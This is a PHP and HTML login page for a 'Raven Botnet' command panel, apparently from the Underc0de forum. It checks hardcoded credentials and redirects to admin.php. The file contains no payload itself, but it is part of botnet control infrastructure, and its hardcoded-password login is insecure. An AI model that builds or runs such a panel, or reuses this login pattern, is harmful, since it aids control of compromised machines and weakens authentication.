<?php
//iniciando sesion
session_start();

$user=$_POST['user'];
$password=$_POST['passw'];
if(isset($_POST['send'])){
    if($user=="q3rv0" && $password=="ravenbot"){
        $_SESSION['estado']="log";
        echo '<META HTTP-EQUIV="Refresh" CONTENT="0; URL=admin.php">';
}
    else {
        echo '<META HTTP-EQUIV="Refresh" CONTENT="0; URL=index.php">';
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//ES" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">

    
    <head>
       <meta name="author" content="[Q]3rV[0]" />
       <meta name="language" content="spanish" />  
       <meta http-equiv="Content-Type" content="text/html" />
       <title>Raven Botnet | Underc0de</title>
       
       <link rel="icon" href="img/favicon.ico" type="image/x-icon" />       
       
       <link type="text/css" rel="stylesheet" href="css/prettyPhoto.css" />
       <link type="text/css" rel="stylesheet" href="css/common.css" />
       <link type="text/css" rel="stylesheet" href="css/raven.css" /> 
       
       <script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>
       <script type="text/javascript" src="js/jquery.easing.1.2.js"></script>
       <script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
       <script type="text/javascript" src="js/cufon-yui.js"></script>
       <script type="text/javascript" src="js/Sansation_700.font.js"></script>  
       <script type="text/javascript" src="js/Sansation_400.font.js"></script>     
       <script type="text/javascript" src="js/Sansation_300.font.js"></script>   
       <script type="text/javascript" src="js/common.js"></script>
       <script type="text/javascript" src="js/raven.js"></script>
       
        <!--[if IE 6]>
        <script type="text/javascript" src="lib/DD_belatedPNG_0.0.8a-min.js"></script>
        <script>
          DD_belatedPNG.fix('.ie6PNGfix, .commonLink');
          
          /* string argument can be any CSS selector */
          /* .ie6PNGfix example is unnecessary */
          /* change it to what suits you! */
        </script>
        <![endif]-->   

                
    </head>
    
    <body>

      <div id="headerContainer">
          <a name="pageTopAnchor"></a>
          <a href="index.php" id="logo" class="ie6PNGfix"></a>
            <div id="titleWrapper">                              
                <a href="index.php" id="title">Underc0de - Raven Botnet - v1.0</a>
                <p class="titleSlogan">Raven Botnet - Powered by [Q]3rv[0]</p> 
            </div> 
               
      </div> 

      <div id="bodyContainer2">    
        <div id="navigationContainer">            
          <ul class="rootnav"></ul>
        </div> 

        <div id="servicesContentContainer">           
          <div id="servicesContainerr">
            <div id="servicesBigInfo">
              <br /><br />
              <center>

                <form action='index.php' method='POST'>
                <h2 id="servicesProductsHeader">User</h2><br />
                <input class="url" name="user" value="" /><br /><br />
                <h2 id="servicesProductsHeader">Password</h2><br />
                <input class="url" name="passw" value="" type="password" /><br /><br />
                <input type="submit" class="btn" name="send" value="Login"> 
                </form>
              </center>

            </div>                                                                                                              
          </div>
        </div> 
            
        <div class="clearBoth"></div>                      
      </div> 
     
      <br />

    </body>
</html>